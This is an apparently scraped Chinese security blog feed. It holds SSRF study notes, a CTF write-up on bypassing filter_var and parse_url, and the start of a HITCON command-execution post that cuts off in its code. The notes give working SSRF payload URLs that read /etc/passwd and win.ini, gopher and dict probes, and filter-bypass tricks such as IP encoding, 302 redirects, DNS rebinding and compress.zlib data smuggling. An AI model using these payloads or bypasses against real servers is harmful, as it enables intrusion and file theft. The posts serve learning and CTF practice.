class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><h2 id="0x04-可利用协议"><a href="#0x04-可利用协议" class="headerlink" title="0x04 可利用协议"></a>0x04 可利用协议</h2><p>ssrf的危害大多是来自于其对于各种协议的支持，其中以curl_exec为最，几乎支持各种协议，其次是file_get_contens，最后的fsockopen几乎就不支持仍和协议了。</p><p>先附上一波各语言ssrf可以利用的协议：<br><img src="/3755095433/8.jpg" alt></p><p>从图中也可以看出curl支持的协议是最多的，而php其次，但是php仍带有一些封装协议可以利用。需要提一下windows可利用的curl协议要比linux少很多。本地测试的不一定对，gopher就不支持</p><p>最为常见的协议为下面这些</p><blockquote><p> file://        //File协议⽤于访问本地⽂件<br> http://  https://        //http和https⽤于访问互联⽹⽂件<br> dict://        //dict协议是⼀个字典服务器协议，<br> gopher://        //ssrf中的最强协议，其最⼤优点就在于可以发送各种格式的请求。<br> smtp://  pop3://  imap://        //常⻅的邮件协议 ，可以用来爆破邮件的用户名和密码<br> ftp://  tftp://        //⽂件传输协议，若有未授权则可以直接读取⽂件 ，也可爆破<br> php://        //⽤php伪协议可读取⽂件<br> phar://        //触发反序列化</p></blockquote><p>协议这方面触及的不多，可能会单独写文章进行总结，gopher肯定是要详细谢谢的，太强大了</p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>ssrf利用面是真的广，基本什么都能做，大题为下面三类</p><h3 id="6-1-内网应用攻击"><a href="#6-1-内网应用攻击" class="headerlink" title="6.1 内网应用攻击"></a>6.1 内网应用攻击</h3><p>内网攻击算是ssrf最NP的地方了，其中最出名的就是ssrf配合redis数据库getshell，多是利用gopher协议，由于篇幅我会在gopher里面详解。<br>其次就是内网服务探测了，主要是利用<code>dict://、ftp://、http://、telnet://</code>等协议尽心探测</p><h3 id="6-2-任意文件读取"><a href="#6-2-任意文件读取" class="headerlink" title="6.2 任意文件读取"></a>6.2 任意文件读取</h3><p>SSRF其实也可以分为有无回显两种，在文件读取这个地方提一下，文件读取就是file://协议了</p><h4 id="6-2-1有回显"><a href="#6-2-1有回显" class="headerlink" title="6.2.1有回显"></a>6.2.1有回显</h4><h5 id="6-2-1-1-完全回显SSRF"><a href="#6-2-1-1-完全回显SSRF" class="headerlink" title="6.2.1.1 完全回显SSRF"></a>6.2.1.1 完全回显SSRF</h5><p>直接利用请求，然后根据回显判断<br><code>http://localhost/ssrf.php?url=file:///etc/passwd</code><br><code>http://localhost.com/ssrf.php?url=file:///C:/Windows/win.ini</code><br>其他协议利用方式：</p><pre><code>gophergopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_testdicthttp://127.0.0.1/ssrf.php?url=dict://127.0.0.1:port/infohttphttp://127.0.0.1/ssrf.php?url=http://xxx.com/302.php</code></pre><p>直接根据回显内容和状态判读即可</p><h5 id="6-2-1-2BOOL型ssrf"><a href="#6-2-1-2BOOL型ssrf" class="headerlink" title="6.2.1.2BOOL型ssrf"></a>6.2.1.2BOOL型ssrf</h5><p>上面的会完整的显示回显信息，但是还以一种则只会返回True or False。这种要想读取文件就需要考虑OOB了，目前木的思路，感觉可行性不高。仍可进行内网探测与攻击……</p><p>需要注意的是即使返回true，payload也不一定执行成功。</p><h4 id="6-3-2无回显"><a href="#6-3-2无回显" class="headerlink" title="6.3.2无回显"></a>6.3.2无回显</h4><p>无回显就只能通过在vps上通过监听，进行测试，对于无回显无法判断命令是否执行成功，只能进行探测。可以先测一波协议，再从一些协议上下手，搞出来回显。或者直接尝试攻击……</p><h3 id="6-3-Dos"><a href="#6-3-Dos" class="headerlink" title="6.3 Dos"></a>6.3 Dos</h3><p>请求大文件，始终保持连接Keep-Alive Always</p><h2 id="0x06-漏洞常见的出现场景"><a href="#0x06-漏洞常见的出现场景" class="headerlink" title="0x06 漏洞常见的出现场景"></a>0x06 漏洞常见的出现场景</h2><p>直接先上某大佬的一张脑图和大佬们的总结，感觉总结的已经很完整了，就不班门弄斧了，还得多实践。总结一句话就是一切需要有url的地方都可能存在</p><blockquote><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞<br>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol></blockquote><h2 id="0x07-漏洞防御"><a href="#0x07-漏洞防御" class="headerlink" title="0x07 漏洞防御"></a>0x07 漏洞防御</h2><ol><li>协议禁用，只允许http和https</li><li>黑名单过滤，禁止访问内网ip</li><li>端口限制</li><li>白名单，设置只可访问的url</li><li>禁止跳转，防止利用url跳转进行绕过</li><li>感觉也可以做一些符号过滤如@</li></ol><p>这是我能想到的，看其他师傅们还有两种方法<br>一种是对过滤返回信息，还有就是统一错误信息<br>第一种是在把返回结果给用户之前进行一次检验，后一种则是防止用户可以根据错误信息来判断远端服务器的端口状态</p><h2 id="0x08-bypass姿势"><a href="#0x08-bypass姿势" class="headerlink" title="0x08 bypass姿势"></a>0x08 bypass姿势</h2><p>通过上面的防御方式，其实也能看出来一下bypass的姿势</p><h3 id="8-1绕过姿势"><a href="#8-1绕过姿势" class="headerlink" title="8.1绕过姿势"></a>8.1绕过姿势</h3><h4 id="8-1-1-特殊地址"><a href="#8-1-1-特殊地址" class="headerlink" title="8.1.1 特殊地址"></a>8.1.1 特殊地址</h4><ol><li>[::]<br>利用的应该是ipv6，windows本机测试失败，linux服务器可能是网卡问题提示网络问题，应该在linuz服务器上是可以用的</li><li><a href="http://0/" target="_blank" rel="noopener">http://0/</a><br>等同于127.0.0.1，windows失败，linux成功<h4 id="8-1-2-、-字符绕过"><a href="#8-1-2-、-字符绕过" class="headerlink" title="8.1.2 @、#字符绕过"></a>8.1.2 @、#字符绕过</h4>下面会有详细介绍<h4 id="8-1-3-利用Enclosed-alphanumerics（封闭式字符数字）绕过"><a href="#8-1-3-利用Enclosed-alphanumerics（封闭式字符数字）绕过" class="headerlink" title="8.1.3 利用Enclosed alphanumerics（封闭式字符数字）绕过"></a>8.1.3 利用Enclosed alphanumerics（封闭式字符数字）绕过</h4>应该时编码的问题，同样windows失败，linux成功<pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre><h4 id="8-1-4-句号绕过"><a href="#8-1-4-句号绕过" class="headerlink" title="8.1.4 句号绕过"></a>8.1.4 句号绕过</h4>windows失败，linux成功</li></ol><p><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></p><h4 id="8-1-5-短地址绕过"><a href="#8-1-5-短地址绕过" class="headerlink" title="8.1.5 短地址绕过"></a>8.1.5 短地址绕过</h4><p>可以利用短地址绕过一些限制</p><h4 id="8-1-6-利用特殊DNS解析绕过"><a href="#8-1-6-利用特殊DNS解析绕过" class="headerlink" title="8.1.6 利用特殊DNS解析绕过"></a>8.1.6 利用特殊DNS解析绕过</h4><p>.xip.io这个解析服务器会把IP地址+.xio.io全返回到IP地址，无论前面有多少级子域名</p><pre><code>          10.0.0.1.xip.io   resolves to   10.0.0.1      www.10.0.0.1.xip.io   resolves to   10.0.0.1   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</code></pre><h4 id="8-1-7-进制转换绕过"><a href="#8-1-7-进制转换绕过" class="headerlink" title="8.1.7 进制转换绕过"></a>8.1.7 进制转换绕过</h4><p>我们访问域名实际上是访问域名所对应的ip地址，这些ip地址⼀般都是点分⼗进制，我们可以将其转化为⼗进制整数或者⼗六进制或者⼋进制点分和十六进制点分。转换脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">ip2decimalism</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>     dec_value <span class="token operator">=</span> <span class="token number">0</span>     v_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>             v_list<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>             t<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">for</span> v <span class="token keyword">in</span> v_list<span class="token punctuation">:</span>                    dec_value <span class="token operator">+=</span> int<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">*</span> t                    t <span class="token operator">=</span> t <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">8</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> dec_value<span class="token keyword">def</span> <span class="token function">ip2hex</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            ip_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>            hex_ip<span class="token operator">=</span><span class="token string">"0x"</span>            <span class="token keyword">for</span> ip_num <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                    hex_data<span class="token operator">=</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ip_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            hex_ip<span class="token operator">=</span>hex_ip<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">+</span>hex_data                    <span class="token keyword">else</span><span class="token punctuation">:</span>                            hex_ip<span class="token operator">=</span>hex_ip<span class="token operator">+</span>hex_data             <span class="token keyword">return</span> hex_ip<span class="token keyword">def</span> <span class="token function">ip2oct</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            ip_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>            oct_ip<span class="token operator">=</span><span class="token string">''</span>            <span class="token keyword">for</span> ip_num <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                    oct_data<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">+</span>oct<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ip_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    oct_ip<span class="token operator">+=</span>oct_data<span class="token operator">+</span><span class="token string">"."</span>            <span class="token keyword">return</span> oct_ip<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ip<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2hex<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"int ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2decimalism<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"oct ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2oct<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="8-1-8-利用非http协议绕过"><a href="#8-1-8-利用非http协议绕过" class="headerlink" title="8.1.8 利用非http协议绕过"></a>8.1.8 利用非http协议绕过</h4><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p><h4 id="8-1-9-利用302跳转绕过"><a href="#8-1-9-利用302跳转绕过" class="headerlink" title="8.1.9 利用302跳转绕过"></a>8.1.9 利用302跳转绕过</h4><p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中。<br>demo:</p><pre><code>&lt;?php  $url = $_GET[&#39;u&#39;];header(&quot;Location: $url&quot;); </code></pre><h4 id="8-1-10-DNS-Rebinding绕过"><a href="#8-1-10-DNS-Rebinding绕过" class="headerlink" title="8.1.10 DNS Rebinding绕过"></a>8.1.10 DNS Rebinding绕过</h4><blockquote><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><p>看这个图：<br><img src="https://img-blog.csdnimg.cn/20191011171513668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MTAxMDQ5,size_16,color_FFFFFF,t_70" alt><br>从图中可以看出来请求的流程：</p><ol><li>当用户请求一个url时，会先向获取一个host</li><li>对host进行DNS解析,返回一个IP(此时的DNS服务器可能是本地,也可能是其他的)</li><li>判断IP是否合法</li><li>合法的话会再去进行一次DNS解析</li></ol><p>首要条件就是要TTL为0,即DNS记录在DNS服务器上缓存时间为0,等于无缓存.这样我们只需要设置两个解析,其中一个为内网地址,就可能会绕过内网的限制,但是有点拼几率.还有一种方式是通过ns记录解析到一个子域名,然后再把子域名解析到内网ip,这样的话就能直接到内网.</p><h3 id="8-2-具体场景的绕过"><a href="#8-2-具体场景的绕过" class="headerlink" title="8.2 具体场景的绕过"></a>8.2 具体场景的绕过</h3><h4 id="8-2-1-限制为http-www-xxx-com-域名时"><a href="#8-2-1-限制为http-www-xxx-com-域名时" class="headerlink" title="8.2.1 限制为http://www.xxx.com 域名时"></a>8.2.1 限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时</h4><p>先放一张图 url的组成<br><img src="https://legoc.github.io/2018/09/08/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1.jpg" alt></p><p>通过可以看到一般URL会通过@来区分用户名和域名，这样我们就可以通过@来绕过域名的限制，不同的处理函数处理机制是不一样的，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的</p><p>基于parse_url也可利用#等字符绕过，# 会阻断把前面的当成host</p><p>再就是filter_var的限定，可以用data://绕过，主要是因为filter_var()函数对于<a href="http://evil.com;google.com" target="_blank" rel="noopener">http://evil.com;google.com</a> 会返回false也就是认为url格式错误，但是对于0://evil.com:80;google.com:80/ 、0://evil.com:80,google.com:80/、0://evil.com:80\google.com:80/却返回true</p><h3 id="8-2-2-限制请求IP不为内网地址"><a href="#8-2-2-限制请求IP不为内网地址" class="headerlink" title="8.2.2 限制请求IP不为内网地址"></a>8.2.2 限制请求IP不为内网地址</h3><ol><li>短网址绕过</li><li>使用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1</li><li>进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</li></ol><h3 id="8-2-3限制请求只为http协议"><a href="#8-2-3限制请求只为http协议" class="headerlink" title="8.2.3限制请求只为http协议"></a>8.2.3限制请求只为http协议</h3><ol><li>url跳转</li><li>短地址</li></ol><h2 id="0x09-PS-思维导图"><a href="#0x09-PS-思维导图" class="headerlink" title="0x09 PS:思维导图"></a>0x09 PS:思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200401192351.png" alt></p><p>PS:Gopher协议的文章写好了，感兴趣的师傅可以看看，算是这篇文章的延申</p><h2 id="0x10-参考文章"><a href="#0x10-参考文章" class="headerlink" title="0x10 参考文章"></a>0x10 参考文章</h2><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">了解SSRF,这一篇就足够了</a><br><a href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">SSRF的一些利用姿势</a><br><a href="https://xz.aliyun.com/t/6373" target="_blank" rel="noopener">https://xz.aliyun.com/t/6373</a><br><a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a><br><a href="https://blog.csdn.net/qq_39101049/article/details/102501839s" target="_blank" rel="noopener">https://blog.csdn.net/qq_39101049/article/details/102501839s</a><br><a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89426041</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道CTF的trick分析</title>
      <link href="/4215173263.html"/>
      <url>/4215173263.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><p>代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"you are hacker"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/127\.0\.0\.1$/'</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token string">'nononono'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token string">'nonono!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h2><p>首先看filter_var()函数的官方说明<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314224534.png" alt></p><blockquote><p>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<br>Name: “validate_url”<br>ID-number: 273<br>可能的标志：<br>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL（比如 <a href="http://example）" target="_blank" rel="noopener">http://example）</a><br>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（比如 <a href="http://www.example.com）" target="_blank" rel="noopener">http://www.example.com）</a><br>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在域名后存在路径（比如 <a href="http://www.example.com/example1/test2/）" target="_blank" rel="noopener">www.example.com/example1/test2/）</a><br>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如 “example.php?name=Peter&amp;age=37”）</p></blockquote><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h2><p>先看官方手册<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231824.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231939.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232031.png" alt><br>对于parse_url()的拆分，是有解析漏洞的，根据特定符号进行分段例如通过@分割 user 与 host<br>这样就可以伪造host<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232827.png" alt></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先我们要post一个url，而且host是以127.0.0.1结尾，有一个题目，是要以baidu.com结尾，这就衍生了另外的思路：买域名，或者post.baidu.com跳转<br>正常情况下，利用parse_url()的解析漏洞，其实就可以绕过了，但是在后面有<code>file_get_contens</code>的情况下，我们需要传入数据让<code>file_get_contens</code>读取，因为php对于MIME不敏感，我们可以修改text来利用data://来绕过，如：<code>data://baidu.com/plain;base64,xxxxx</code>，but,data://被ban了，看了大佬们的WP，发现可以利用<code>compress.zlib://data:@127.0.0.1/palin,让file_get_contens读取的代码</code>来绕过，<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235825.png" alt></p><p>为什么要用<code>compress.zlib://</code>没怎么弄懂，希望知道的大佬们指点一波，我分析的应该是compress.zlib://将后面的当成了要读取的文件（具体伪协议会另写一篇文章），并且根据官方手册说明</p><blockquote><p>compress.zlib://、 compress.bzip2:// 和 gzopen()、bzopen() 是相等的<br>尝试换成 compress.bzip2://试了一下，但是不知道为什么返回的全是空白（同求大佬指点）</p></blockquote><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>这道题目大概就这些知识点和trick<br>下面再附上以为师傅的关于file_get_contens获取数据的总结截图<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235620.png" alt></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">【SSRF】如何绕过filter_var(), preg_match() 和 parse_url()</a><br><a href="https://blog.dyboy.cn/websecurity/154.html#title-3" target="_blank" rel="noopener">一道CTF题目的探究</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过</title>
      <link href="/1877436815.html"/>
      <url>/1877436815.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-HITCON-2017-babyfirst-revenge"><a href="#0x01-HITCON-2017-babyfirst-revenge" class="headerlink" title="0x01 HITCON 2017 babyfirst-revenge"></a>0x01 HITCON 2017 babyfirst-revenge</h2><p>最近比遇到一个关于四字符getshell的问题，就把这道题目拿过来分析一下<br>v1代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token 